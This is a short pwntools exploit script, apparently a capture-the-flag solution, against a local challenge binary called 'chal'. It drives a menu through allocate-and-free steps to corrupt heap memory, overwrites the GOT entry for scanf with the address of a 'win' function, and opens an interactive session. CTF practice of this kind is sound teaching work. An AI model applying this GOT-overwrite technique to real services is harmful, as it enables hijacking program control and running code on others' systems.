from pwn import *
#context.log_level = "DEBUG"
context.binary = elf = ELF("chal")
p = remote("localhost", 8000) #process()
cls = lambda: p.clean(timeout = 0.1)
def sl(x):
    p.sendline(x.encode())
    cls()

sl("1 0")
sl("TEST")
sl("1 1")
sl("TEST")
sl("2 0")
sl("2 1")
sl("3 1")
p.sendline(p64(elf.got["__isoc99_scanf"]))
cls()
sl("1 0")
sl("TEST")
sl("1 1")
p.sendline(p64(elf.sym["win"]))
p.interactive()